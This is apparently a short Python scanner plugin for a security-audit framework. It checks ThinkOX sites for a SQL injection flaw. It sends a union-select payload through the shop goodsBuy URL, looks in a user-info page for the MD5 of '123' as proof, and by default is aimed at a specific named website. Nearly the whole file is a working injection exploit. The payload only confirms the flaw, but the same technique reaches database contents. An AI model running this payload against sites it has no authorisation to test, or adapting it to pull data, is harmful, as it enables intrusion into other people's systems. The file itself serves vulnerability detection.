#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://0day5.com/archives/3103
#__Author__ = Mr.R
#_PlugName_ = thinkox_sql Plugin
#_FileName_ = thinkox_sql.py

def assign(service, arg):
	if service == 'thinkox':
		return True,arg

def audit(arg):
	url1=arg+'index.php?s=/shop/index/goodsBuy/name/%E5%95%8A/address/a/zipcode/123456/phone/13322222222/id/1)union%20select%201,md5(123),3,4,5,-9999,7,8,9,10,11,12,13%23.html'
	code,head,body,errcode,fina_url=curl.curl(url1)
	url2=arg+'index.php?s=/usercenter/public/getinformation.html'
	code,head,body,errcode,fina_url=curl.curl(url2)
	if code == 200 and '202cb962ac59075b964b07152d234b70' in body :
		security_hole('\n'+url1+'\n'+url2+'\n'+'存在thinkox注入,需登录')
if __name__ == '__main__':
  from dummy import *
  audit(assign('thinkox', 'http://www.naheli.com/')[1])